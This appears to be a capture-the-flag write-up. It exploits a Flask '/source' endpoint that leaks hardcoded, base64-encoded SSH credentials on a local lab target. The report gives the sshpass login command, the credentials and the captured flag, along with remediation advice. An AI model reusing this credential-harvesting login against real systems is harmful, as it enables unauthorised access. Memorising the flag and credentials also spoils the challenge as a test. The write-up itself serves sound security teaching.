## TL;DR
- Objective: Authenticate to OpenSSH service using hardcoded credentials exposed in source code
- Outcome: ACHIEVED - Successful SSH authentication and flag extraction
- Highest-impact finding: Hardcoded credentials (CWE-798) allowed complete SSH access to the target system
- Validation status: Flag captured via successful SSH login

## Target Information
- Target: 127.0.0.1:32946
- Host / base URL: 127.0.0.1:32946
- Application or component: OpenSSH 9.2p1 on Debian
- Authentication context: SSH password authentication with exposed credentials
- Relevant technology details: OpenSSH 9.2p1, Flask application with exposed `/source` endpoint, base64-encoded password storage

## Confirmed Vulnerability
### Hardcoded Credentials (CWE-798)
- Affected endpoint / component: Flask application source code accessible via `/source` endpoint; OpenSSH service on port 32946
- Impact: Complete authentication bypass allowing full SSH access to the target system
- Preconditions: Access to Flask application `/source` endpoint to retrieve credentials
- Exact payload or PoC: Credentials discovered in source code:
  - Username: `pedro`
  - Password: `AHeavySandbag!` (base64 encoded as `QUhlYXZ5U2FuZGJhZyE=`)

### Information Disclosure via Source Code (CWE-540)
- Affected endpoint / component: `/source` endpoint of Flask web application
- Impact: Exposure of sensitive credentials through source code disclosure
- Preconditions: HTTP access to the Flask application
- Exact payload or PoC: Direct HTTP GET request to `/source` endpoint revealed application source containing hardcoded credentials

### Insecure Credential Storage
- Affected endpoint / component: Application source code and configuration
- Impact: Credentials effectively exposed via reversible base64 encoding (provides zero security)
- Preconditions: Source code accessible
- Exact payload or PoC: Password was base64 encoded but easily decoded to plaintext: `AHeavySandbag!`

## Steps to Reproduce
1. Access the Flask web application and navigate to the `/source` endpoint
2. Review the exposed source code to identify hardcoded credentials:
   - Username: `pedro`
   - Password: `AHeavySandbag!` (note: was encoded as base64 in source)
3. Install `sshpass` tool for automated SSH password authentication:
   ```bash
   apt-get install -y sshpass
   ```
4. Connect to the OpenSSH service using the discovered credentials:
   ```bash
   sshpass -p 'AHeavySandbag!' ssh -p 32946 -o StrictHostKeyChecking=no pedro@127.0.0.1
   ```
5. Upon successful login, verify current directory:
   ```bash
   pwd
   ```
6. List all files including hidden ones:
   ```bash
   ls -la
   ```
7. Extract the flag from FLAG.txt:
   ```bash
   cat FLAG.txt
   ```

## Validation / Evidence
- Validation token / flag: `FLAG{a0cb3c321396d011884d01c3217fd9400b96561246d29d51f961ada96496d23e}`
- Tool evidence: SSH connection established using sshpass with automated password authentication
- Request evidence: SSH connection to 127.0.0.1:32946 with credentials `pedro` / `AHeavySandbag!`
- Response evidence:
```
Warning: Permanently added '[127.0.0.1]:32946' (ED25519) to the list of known hosts.
/home/pedro
total 24
drwxr-xr-x 1 pedro pedro 4096 Dec 27 21:12 .
drwxr-xr-x 1 root  root  4096 Dec 27 21:12 ..
-rw-r--r-- 1 root  root    70 Dec 27 21:12 FLAG.txt
```
- Notes on reliability / limitations: Exploitation is 100% reliable once credentials are obtained from the `/source` endpoint. No rate limiting or additional authentication factors were observed.

## Remediation
- Root cause: Developer embedded sensitive credentials directly into application source code and exposed the source via an unrestricted `/source` endpoint. Additionally, the password was only base64 encoded, which provides no security benefit as it is trivially reversible.
- Recommended fix:
  1. **Remove hardcoded credentials**: Implement external credential storage using environment variables, secrets management services (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault), or encrypted configuration files
  2. **Disable source code exposure**: Remove or restrict the `/source` endpoint entirely
  3. **Use proper encryption**: If credentials must be stored, use strong encryption with proper key management (AES-256 with KMS), not base64 encoding
  4. **Implement SSH key-based authentication**: Replace password authentication with public key authentication for SSH access
  5. **Rotate credentials**: Immediately change the exposed password `AHeavySandbag!` and any systems using similar credentials
- Defense-in-depth:
  - Implement network segmentation to isolate SSH services from web application endpoints
  - Enable fail2ban or similar rate-limiting on SSH logins
  - Use multi-factor authentication (MFA) for SSH access
  - Implement least-privilege access controls on flag files (avoid root ownership)
  - Conduct regular code reviews and static analysis to detect hardcoded credentials
  - Use pre-commit hooks with tools like `git-secrets` or `truffleHog` to prevent credential commits

## How to Verify the Fix
1. Attempt to access the `/source` endpoint - should return 404 or require authentication
2. Verify no credentials appear in application source code using grep:
   ```bash
   grep -r "AHeavySandbag!\|QUhlYXZ5U2FuZGJhZyE=" /path/to/source/
   ```
3. Verify no hardcoded credentials via static analysis:
   ```bash
   trufflehog filesystem /path/to/source/
   ```
4. Attempt SSH authentication with old credentials - should fail:
   ```bash
   sshpass -p 'AHeavySandbag!' ssh -p 32946 pedro@127.0.0.1
   # Expected: Permission denied
   ```
5. Verify SSH now requires key-based authentication:
   ```bash
   ssh -p 32946 pedro@127.0.0.1
   # Expected: prompt for key passphrase or key file, NOT password
   ```

## Remaining Leads
- Confirmed blockers: None - full exploitation achieved
- Unverified leads: None - all objectives completed
- Missing context: None - full chain from credential discovery to flag capture documented

---

## Detailed Attack Chain Summary

The assessment successfully demonstrated a complete exploitation chain:

1. **Discovery**: Flask web application exposed source code via `/source` endpoint
2. **Credential Extraction**: Source code contained hardcoded SSH credentials with base64-encoded password
3. **Credential Decoding**: Base64 password `QUhlYXZ5U2FuZGJhZyE=` decoded to `AHeavySandbag!`
4. **Service Enumeration**: Identified OpenSSH 9.2p1 running on port 32946
5. **Authentication**: Successful SSH login using discovered credentials
6. **System Access**: Full shell access as user `pedro` in `/home/pedro`
7. **Flag Extraction**: Retrieved flag from root-owned file `/home/pedro/FLAG.txt`

This represents a textbook **CWE-798: Use of Hard-coded Credentials** vulnerability with clear impact: complete system compromise due to irresponsible credential management practices.

## Service Fingerprint

```
SSH-2.0-OpenSSH_9.2p1
Debian-based system
```

Target service confirmed as OpenSSH 9.2p1 on Debian through multiple banner grab methods.
